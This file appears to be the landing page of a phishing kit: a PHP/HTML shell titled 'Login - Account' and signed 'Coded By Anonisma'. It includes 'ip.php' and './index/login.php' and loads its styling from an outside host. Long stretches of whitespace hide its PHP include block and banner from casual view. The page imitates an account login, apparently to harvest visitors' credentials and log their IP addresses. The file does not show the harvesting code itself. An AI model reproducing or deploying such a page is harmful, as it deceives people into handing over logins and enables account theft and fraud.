																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																							

<?php
if (!isset($_SESSION)) {
  session_start();
}

include      "ip.php";         
    


?>																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																								<!--


   ______              __             __                  ____                            ___                            _                             
  / ____/  ____   ____/ /  ___   ____/ /                 / __ )   __  __                 /   |   ____   ____    ____    (_)   _____   ____ ___   ____ _
 / /      / __ \ / __  /  / _ \ / __  /                 / __  |  / / / /                / /| |  / __ \ / __ \  / __ \  / /   / ___/  / __ `__ \ / __ `/
/ /___   / /_/ // /_/ /  /  __// /_/ /                 / /_/ /  / /_/ /                / ___ | / / / // /_/ / / / / / / /   (__  )  / / / / / // /_/ / 
\____/   \____/ \__,_/   \___/ \__,_/                 /_____/   \__, /                /_/  |_|/_/ /_/ \____/ /_/ /_/ /_/   /____/  /_/ /_/ /_/ \__,_/  
  																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																								-->




<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">

<html>
<!-- AnO_onisma -->




<head>

<meta http-equiv="content-type" content="text/html;charset=utf-8" /> 
<link rel="icon" type="image/x-icon" href="http://niceshopweb.com/7+/An-on-is-ma/hooool.ico">



    <title> Login - Account </title>
   

<link rel="stylesheet" href="http://niceshopweb.com/css777/ind-AAnnoo.css">
<script src="./AA-NN-OO-NN-II-SS-MM-AA/ind-AAnnoo.js" type="text/javascript" charset="utf-8"></script>
   
<link rel="shortcut icon" link rel="logo-icon" href="img/iconisma.png">



</head>


<div>


<body background="http://niceshopweb.com/7+/An-on-is-ma/fondo.png" style="background-repeat: no-repeat" > 






<? include ("./index/login.php"); ?>

		




</body>


<p style=" 1; position: absolute; top: 705px; left: 260px; "><font face=" sans-serif " size=1 color="#FFFFFF">Coded By Anonisma</font></p>
	
	</body>

<!-- AnO_onisma -->
</html>

